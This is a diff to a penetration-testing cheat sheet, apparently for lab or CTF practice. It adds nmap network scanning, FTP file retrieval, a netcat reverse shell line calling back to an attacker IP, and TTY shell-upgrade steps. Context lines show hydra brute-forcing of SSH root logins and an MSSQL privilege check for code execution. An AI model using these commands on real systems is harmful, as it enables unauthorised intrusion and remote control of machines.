@@ -4,6 +4,7 @@
 
 ### nmap
 
+Scan network `nmap <NETWORK>/<CIDR>` <br />
 Scan for open ports: `nmap <IP> -p- -T4` <br />
 Scan for services and their versions: `nmap <IP> -p<PORT>,<PORT2>,<...> -T4 -A` <br />
 
@@ -17,9 +18,10 @@ Hunter.io, TheHarvester, breach-parse
   
 ## Enumeration
 
-## FTP (21)
+### FTP (21)
 try to connect to ftp-server: `ftp <IP>`, Username: `anonymous`, Password: `<ENTER>` or `Anonymous` <br />
 try to find anything interesting, remember to check for hidden directories as well: `ls -la`
+copy file from server to client: `ftp> get <REMOTE-FILE> [<LOCAL-FILE>]`
 
 ### SSH (22)
 try to connect to ssh: `ssh <IP>`. In case of `no matching key exchange method found. Their offer...` use something in lines of `ssh 192.168.57.134 -oKexAlgorithms diffie-hellman-group1-sha1` or `ssh 192.168.57.134 -oKexAlgorithms diffie-hellman-group1-sha1 -c aes128-cbc`<br />
@@ -49,9 +51,18 @@ typical file extensions are: for Apache .php; for Microsoft asp, aspx; for Other
 try to connect via impacket's `mssqlclient.py <USER>@<IP> -windows-auth`<br />
 check for admin priviledges to be able to have remote code execution ``SELECT IS_SRVROLEMEMBER (`sysadmin`) `` <br />
 
-
-
 ## Exploitation
+
+### NC / reverse shell
+set up netcat to listen to a specified port: `nc -lvnp <PORT>`<br />
+to connect back to our attacker machine: `nc -e /bin/sh <ATTACKER-IP> <PORT>`<br />
+
+#### upgrading shell
+if python is available: `python -c 'import pty; pty.spawn ("/bin/bash")'` <br />
+background the shell with `Ctrl-Z` <br />
+set the stty to raw and echo the input characters: `stty raw -echo` the shell will look broken, but continue <br />
+foreground the shell with `fg` and hit `Enter` two times or reinitialize the terminal with `reset` <br />
+your shell should now have features like tab-completing, history, Ctrl-C without breaking the connection, ... <br />
 
 ### SSH (22)
 try to bruteforce ssh login with hydra `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<IP>:<PORT> -t 4 -V` <br />
